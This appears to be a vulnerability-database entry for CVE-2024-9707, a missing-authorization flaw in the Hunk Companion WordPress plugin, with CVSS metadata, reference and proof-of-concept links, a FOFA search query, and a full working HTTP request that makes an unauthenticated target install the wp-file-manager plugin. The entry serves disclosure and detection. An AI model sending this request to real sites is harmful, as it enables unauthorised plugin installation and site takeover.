---
layout: "post"
cve_id: "CVE-2024-9707"
title: "Hunk Companion <= 1.8.4 - Arbitrary Plugin Installation"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-9707.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-9707.yaml"
author: "DhiyaneshDK"
severity: "critical"
reference:
  - "https://wordpress.org/plugins/hunk-companion/"
  - "https://www.wordfence.com/threat-intel/vulnerabilities/id/9c101fca-037c-4bed-9dc7-baa021a8b59c?source=cve"
  - "https://github.com/iSee857/CVE-PoC/blob/main/WordPress_Hunk_Companion(CVE-2024-9707).py"
  - "https://github.com/RandomRobbieBF/CVE-2024-9707"
  - "https://nvd.nist.gov/vuln/detail/CVE-2024-9707"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
  cvss-score: 9.8
  cve-id: "CVE-2024-9707"
  cwe-id: "CWE-862"
  epss-score: 0.90085
  epss-percentile: 0.99553
  cpe: "cpe:2.3:a:themehunk:hunk_companion:*:*:*:*:*:wordpress:*:*"
metadata:
  verified: True
  max-request: 1
  vendor: "themehunk"
  product: "hunk_companion"
  framework: "wordpress"
  fofa-query: "body=\"/wp-content/plugins/hunk-companion/\""
tags:
  - "cve"
  - "cve2024"
  - "wp"
  - "wp-plugin"
  - "wordpress"
  - "hunk-companion"
  - "intrusive"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## ðŸ” Vulnerability Description
The Hunk Companion plugin for WordPress is vulnerable to unauthorized plugin installation/activation due to a missing capability check on the /wp-json/hc/v1/themehunk-import REST API endpoint in all versions up to, and including, 1.8.4. This makes it possible for unauthenticated attackers to install and activate arbitrary plugins which can be leveraged to achieve remote code execution if another vulnerable plugin is installed and activated.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-json/hc/v1/themehunk-import HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Length: 352
Content-Type: application/json
Accept-Encoding: gzip

{"params": {"templateType": "free", "plugin": {"wp-file-manager": "Wp File Manager"}, "allPlugins": [{"wp-file-manager": "wp-file-manager/wp-file-manager.php"}], "builder": "gogo", "themeSlug": "gogo", "proThemePlugin": "wp-file-manager", "tmplFreePro": "plugin", "wpUrl": "https://downloads.wordpress.org/", "thUrl": "https://themehunk.com/wp/data/"}}
```


